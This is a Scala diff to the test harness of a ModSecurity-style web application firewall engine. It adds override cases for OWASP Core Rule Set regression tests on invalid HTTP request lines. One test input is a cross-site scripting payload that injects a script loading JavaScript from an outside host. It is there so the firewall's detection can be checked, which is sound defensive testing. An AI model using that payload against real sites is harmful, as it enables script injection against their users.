@@ -130,7 +130,7 @@ object CRSTestUtils {
         |# SecRuleEngine DetectionOnly
         |""".stripMargin
     val config = SecLang.parse(finalRules).right.get
-    val program = SecLang.compile(config).copy(removedRuleIds = Set(920273, 920274, 920100)) // TODO: remove and fix
+    val program = SecLang.compile(config).copy(removedRuleIds = Set(920273, 920274)) // TODO: remove and fix
     SecLang.engine(program, files = files)
   }
 
@@ -219,6 +219,161 @@ object CRSTestUtils {
       protocol = (json \ "protocol").asOpt[String].getOrElse("HTTP/1.1"),
     )
   }
+
+  val testOverrides = Map(
+    (920100, 2) -> Json.parse("""{
+        |  "test_id" : 2,
+        |  "desc" : "Request has tab (\\t) before request method - Apache complains\nAH00126: Invalid URI in request      GET / HTTP/1.1\n",
+        |  "stages" : [ {
+        |    "input" : {
+        |      "dest_addr" : "127.0.0.1",
+        |      "method" : "     GET",
+        |      "port" : 80,
+        |      "headers" : {
+        |        "User-Agent" : "OWASP CRS test agent",
+        |        "Host" : "localhost",
+        |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        |      },
+        |      "uri" : "/get",
+        |      "version" : "HTTP/1.1"
+        |    },
+        |    "output" : {
+        |      "log" : {
+        |        "expect_ids": [911100]
+        |      }
+        |    }
+        |  } ]
+        |}""".stripMargin),
+    (920100, 5) -> Json.parse("""{
+        |  "test_id" : 5,
+        |  "desc" : "invalid Connect request, domains require ports",
+        |  "stages" : [ {
+        |    "input" : {
+        |      "dest_addr" : "127.0.0.1",
+        |      "method" : "CONNECT",
+        |      "port" : 80,
+        |      "headers" : {
+        |        "User-Agent" : "OWASP CRS test agent",
+        |        "Host" : "localhost",
+        |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        |      },
+        |      "uri" : "www.coreruleset.org",
+        |      "version" : "HTTP/1.1"
+        |    },
+        |    "output" : {
+        |      "status" : 200
+        |    }
+        |  } ]
+        |}""".stripMargin),
+    (920100, 8) -> Json.parse("""{
+        |  "test_id" : 8,
+        |  "desc" : "The colon in the path is not allowed. Apache will block by default:\n(20024)The given path is misformatted or contained invalid characters: [client 127.0.0.1:4142] AH00127: Cannot map GET /index.html:80?I=Like&Apples=Today#tag HTTP/1.1 to file\n",
+        |  "stages" : [ {
+        |    "input" : {
+        |      "dest_addr" : "127.0.0.1",
+        |      "method" : "GET",
+        |      "port" : 80,
+        |      "headers" : {
+        |        "User-Agent" : "OWASP CRS test agent",
+        |        "Host" : "localhost",
+        |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        |      },
+        |      "uri" : "/get/index.html:80?I=Like&Apples=Today#tag",
+        |      "version" : "HTTP/1.1"
+        |    },
+        |    "output" : {
+        |      "log" : { "expect_ids": [920610] }
+        |    }
+        |  } ]
+        |}""".stripMargin),
+    (920100, 11) -> Json.parse("""{
+        |  "test_id" : 11,
+        |  "desc" : "An invalid request because a backslash is used in URI.\nApache will end up blocking this before it gets to CRS.\nWe will need to support OR output tests to fix this.\n",
+        |  "stages" : [ {
+        |    "input" : {
+        |      "dest_addr" : "127.0.0.1",
+        |      "port" : 80,
+        |      "headers" : {
+        |        "User-Agent" : "OWASP CRS test agent",
+        |        "Host" : "localhost",
+        |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        |      },
+        |      "uri" : "\\",
+        |      "version" : "HTTP/1.1"
+        |    },
+        |    "output" : {
+        |      "status" : 200
+        |    }
+        |  } ]
+        |}""".stripMargin),
+    (920100, 12) -> Json.parse("""{
+        |  "test_id" : 12,
+        |  "desc" : "Invalid HTTP Request Line (920100) - Test 1 from old modsec regressions",
+        |  "stages" : [ {
+        |    "input" : {
+        |      "dest_addr" : "127.0.0.1",
+        |      "headers" : {
+        |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+        |        "Host" : "localhost",
+        |        "Keep-Alive" : "300",
+        |        "Proxy-Connection" : "keep-alive",
+        |        "User-Agent" : "OWASP CRS test agent"
+        |      },
+        |      "method" : "\tGET",
+        |      "port" : 80,
+        |      "uri" : "/get",
+        |      "version" : "HTTP/1.1"
+        |    },
+        |    "output" : {
+        |      "log" : { "expect_ids": [911100, 920100] }
+        |    }
+        |  } ]
+        |}""".stripMargin),
+    (920100, 13) -> Json.parse("""{
+       |  "test_id" : 13,
+       |  "desc" : "Invalid HTTP Request Line (920100) - Test 2 from old modsec regressions",
+       |  "stages" : [ {
+       |    "input" : {
+       |      "dest_addr" : "127.0.0.1",
+       |      "headers" : {
+       |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+       |        "Host" : "localhost",
+       |        "Keep-Alive" : "300",
+       |        "Proxy-Connection" : "keep-alive",
+       |        "User-Agent" : "OWASP CRS test agent"
+       |      },
+       |      "method" : "GET",
+       |      "port" : 80,
+       |      "uri" : "\\index.html",
+       |      "version" : "HTTP\\1.0"
+       |    },
+       |    "output" : {
+       |      "log" : { "expect_ids": [920100, 920460] }
+       |    }
+       |  } ]
+       |}""".stripMargin),
+    (920100, 15) -> Json.parse("""{
+       |  "test_id" : 15,
+       |  "desc" : "Test as described in http://www.client9.com/article/five-interesting-injection-attacks/",
+       |  "stages" : [ {
+       |    "input" : {
+       |      "dest_addr" : "127.0.0.1",
+       |      "method" : "GET",
+       |      "port" : 80,
+       |      "uri" : "/get/demo/xss/xml/vuln.xml.php?input=<script xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\\\"javascript:(function () {var x = document.createElement(\\\\\\\"script\\\\\\\");x.src = \\\\\\\"//sdl.me/popup.js?//\\\\\\\";document.childNodes\\[0\\].appendChild(x);}());\\\"\",1000)</script>&//",
+       |      "headers" : {
+       |        "User-Agent" : "OWASP CRS test agent",
+       |        "Host" : "localhost",
+       |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+       |      },
+       |      "version" : "HTTP/1.1"
+       |    },
+       |    "output" : {
+       |       "log" : { "expect_ids": [920100] }
+       |    }
+       |  } ]
+       |}""".stripMargin),
+  )
 }
 
 class SecLangCRSTest extends munit.FunSuite {
@@ -266,115 +421,118 @@ class SecLangCRSTest extends munit.FunSuite {
     println(s"Average     : ${fmt(avg)}")
   }
 
-  def execTest(rule: String, path: String): Unit = Try {
-    // println(s"running tests for rule ${rule} ...")
-    val testsFile = CRSTestUtils.read(s"./test-data/coreruleset/tests/regression/tests/${path}")
-    val testsYaml = Yaml.parse(testsFile).get
-    val tests = (testsYaml \ "tests").as[Seq[JsObject]]
-    tests.foreach { test =>
-      val testId = (test \ "test_id").as[Int]
-      if (testOnly.isEmpty || (testOnly.nonEmpty && testOnly.contains((rule, testId)))) {
-        val desc = (test \ "desc").asOpt[String]
-        (test \ "stages").as[Seq[JsObject]].foreach { stage =>
-          counter.incrementAndGet()
-          val input = (stage \ "input").as[JsObject]
-          val ctx = CRSTestUtils.requestContext(input)
-          val start = System.nanoTime()
-          val result = engine.evaluate(ctx, if(ctx.isResponse) List(3, 4) else List(1, 2))
-          val dur = System.nanoTime() - start
-          times = times :+ dur
-          val output = (stage \ "output").as[JsObject]
-          val status = (output \ "status").asOpt[Int]
-          val log = (output \ "log").asOpt[JsObject].getOrElse(Json.obj())
-          val expect_ids: List[Int] = (log \ "expect_ids").asOpt[List[Int]].getOrElse(List.empty)
-          val no_expect_ids: List[Int] = (log \ "no_expect_ids").asOpt[List[Int]].getOrElse(List.empty)
-          var checked = false
-          var ok = true
-          var cause = "--"
-          if (status.isDefined) {
-            checked = true
-            val outStatus = result.disposition match {
-              case Continue => 200
-              case Block(s, _, _) => s
+  def execTest(rule: String, path: String): Unit = {
+    Try {
+      // println(s"running tests for rule ${rule} ...")
+      val testsFile = CRSTestUtils.read(s"./test-data/coreruleset/tests/regression/tests/${path}")
+      val testsYaml = Yaml.parse(testsFile).get
+      val tests = (testsYaml \ "tests").as[Seq[JsObject]]
+      tests.foreach { _test =>
+        val testId = (_test \ "test_id").as[Int]
+        val test = CRSTestUtils.testOverrides.get((rule.toInt, testId)).getOrElse(_test)
+        if (testOnly.isEmpty || (testOnly.nonEmpty && testOnly.contains((rule, testId)))) {
+          val desc = (test \ "desc").asOpt[String]
+          (test \ "stages").as[Seq[JsObject]].foreach { stage =>
+            counter.incrementAndGet()
+            val input = (stage \ "input").as[JsObject]
+            val ctx = CRSTestUtils.requestContext(input)
+            val start = System.nanoTime()
+            val result = engine.evaluate(ctx, if(ctx.isResponse) List(3, 4) else List(1, 2))
+            val dur = System.nanoTime() - start
+            times = times :+ dur
+            val output = (stage \ "output").as[JsObject]
+            val status = (output \ "status").asOpt[Int]
+            val log = (output \ "log").asOpt[JsObject].getOrElse(Json.obj())
+            val expect_ids: List[Int] = (log \ "expect_ids").asOpt[List[Int]].getOrElse(List.empty)
+            val no_expect_ids: List[Int] = (log \ "no_expect_ids").asOpt[List[Int]].getOrElse(List.empty)
+            var checked = false
+            var ok = true
+            var cause = "--"
+            if (status.isDefined) {
+              checked = true
+              val outStatus = result.disposition match {
+                case Continue => 200
+                case Block(s, _, _) => s
+              }
+              if (outStatus != status.get) {
+                failures.incrementAndGet()
+                ok = false
+                println(s"[${rule} - ${testId}] ${desc.getOrElse("--")}")
+                println(s"      failed status check: $outStatus != ${status.get} ")
+              }
+              if (!dev) assertEquals(outStatus, status.get, s"status mismatch for test ${testId}")
             }
-            if (outStatus != status.get) {
-              failures.incrementAndGet()
-              ok = false
-              println(s"[${rule} - ${testId}] ${desc.getOrElse("--")}")
-              println(s"      failed status check: $outStatus != ${status.get} ")
-            }
-            if (!dev) assertEquals(outStatus, status.get, s"status mismatch for test ${testId}")
-          }
-          if (expect_ids.nonEmpty) {
-            checked = true
-            expect_ids.foreach { expect_id =>
+            if (expect_ids.nonEmpty) {
+              checked = true
+              expect_ids.foreach { expect_id =>
 
-              val passed = result.events.exists(evt => evt.ruleId.contains(expect_id))
-              if (passed == false) {
-                ok = false
-                failures.incrementAndGet()
-                println(s"[${rule} - ${testId}] ${desc.getOrElse("--")}")
-                println(s"      failed expect_id check: $expect_id not found ")
-                cause = s"failed expect_id check: $expect_id not found"
+                val passed = result.events.exists(evt => evt.ruleId.contains(expect_id))
+                if (passed == false) {
+                  ok = false
+                  failures.incrementAndGet()
+                  println(s"[${rule} - ${testId}] ${desc.getOrElse("--")}")
+                  println(s"      failed expect_id check: $expect_id not found ")
+                  cause = s"failed expect_id check: $expect_id not found"
+                }
+                if (!dev) assertEquals(passed, true, s"expect_id mismatch for test ${testId}")
               }
-              if (!dev) assertEquals(passed, true, s"expect_id mismatch for test ${testId}")
             }
-          }
-          if (no_expect_ids.nonEmpty) {
-            checked = true
-            no_expect_ids.foreach { no_expect_id =>
-              val notpassed = result.events.exists(evt => evt.ruleId.contains(no_expect_id))
-              if (notpassed == true) {
-                ok = false
-                failures.incrementAndGet()
-                println(s"[${rule} - ${testId}] ${desc.getOrElse("--")}")
-                println(s"      failed no_expect_ids check: $no_expect_id was found ")
-                cause = s"failed no_expect_ids check: $no_expect_id was found"
+            if (no_expect_ids.nonEmpty) {
+              checked = true
+              no_expect_ids.foreach { no_expect_id =>
+                val notpassed = result.events.exists(evt => evt.ruleId.contains(no_expect_id))
+                if (notpassed == true) {
+                  ok = false
+                  failures.incrementAndGet()
+                  println(s"[${rule} - ${testId}] ${desc.getOrElse("--")}")
+                  println(s"      failed no_expect_ids check: $no_expect_id was found ")
+                  cause = s"failed no_expect_ids check: $no_expect_id was found"
+                }
+                if (!dev) assertEquals(notpassed, false, s"no_expect_ids mismatch for test ${testId}")
               }
-              if (!dev) assertEquals(notpassed, false, s"no_expect_ids mismatch for test ${testId}")
             }
+            if (checked && ok) {
+              //  println(s"    - [${rule} - ${testId}] passed")
+            } else if (!checked && ok) {
+              ok = false
+              failures.incrementAndGet()
+              println(s"[${rule} - ${testId}] ${desc.getOrElse("--")}")
+              println(s"      nothing checked for test ${testId} ")
+              cause = s"nothing checked for test ${testId}"
+            }
+            if (!ok) {
+              val descr = desc.getOrElse("--")
+              failingTests = failingTests :+ Json.obj(
+                "test_rule" -> rule,
+                "test_id" -> testId,
+                "test_path" -> path,
+                "description" -> descr,
+                "cause" -> cause,
+                "result" -> result.json,
+                "test" -> test,
+                "tested_rule" -> allRules.find(_.id.contains(rule.toInt)).map(_.json).getOrElse(JsNull).as[JsValue]
+              )
+            }
+            if (!ok && testOnly.nonEmpty && testOnly.contains((rule, testId))) {
+              result.displayPrintln()
+              println(Json.prettyPrint(test))
+              println(Json.prettyPrint(Json.parse(result.events.filter(_.msg.isDefined).last.raw)))
+            }
+            if (!dev) assert(checked, s"nothing checked for test ${testId}")
           }
-          if (checked && ok) {
-            //  println(s"    - [${rule} - ${testId}] passed")
-          } else if (!checked && ok) {
-            ok = false
-            failures.incrementAndGet()
-            println(s"[${rule} - ${testId}] ${desc.getOrElse("--")}")
-            println(s"      nothing checked for test ${testId} ")
-            cause = s"nothing checked for test ${testId}"
-          }
-          if (!ok) {
-            val descr = desc.getOrElse("--")
-            failingTests = failingTests :+ Json.obj(
-              "test_rule" -> rule,
-              "test_id" -> testId,
-              "test_path" -> path,
-              "description" -> descr,
-              "cause" -> cause,
-              "result" -> result.json,
-              "test" -> test,
-              "tested_rule" -> allRules.find(_.id.contains(rule.toInt)).map(_.json).getOrElse(JsNull).as[JsValue]
-            )
-          }
-          if (!ok && testOnly.nonEmpty && testOnly.contains((rule, testId))) {
-            result.displayPrintln()
-            println(Json.prettyPrint(test))
-            println(Json.prettyPrint(Json.parse(result.events.filter(_.msg.isDefined).last.raw)))
-          }
-          if (!dev) assert(checked, s"nothing checked for test ${testId}")
         }
       }
-    }
-  } match {
-    case Failure(e) =>
-      val clazzName = e.getStackTrace.apply(0).getClassName
-      if (!clazzName.startsWith("munit.Assertions")) {
-        println(e.getClass.getName + ": " + e.getMessage)
-      } else {
-        // println(e.getMessage)
-      }
+    } match {
+      case Failure(e) =>
+        val clazzName = e.getStackTrace.apply(0).getClassName
+        if (!clazzName.startsWith("munit.Assertions")) {
+          println(e.getClass.getName + ": " + e.getMessage)
+        } else {
+          // println(e.getMessage)
+        }
       // throw e // TODO: uncomment for back to normal
-    case Success(s) => s
+      case Success(s) => s
+    }
   }
 
   test("REQUEST-911-METHOD-ENFORCEMENT") {
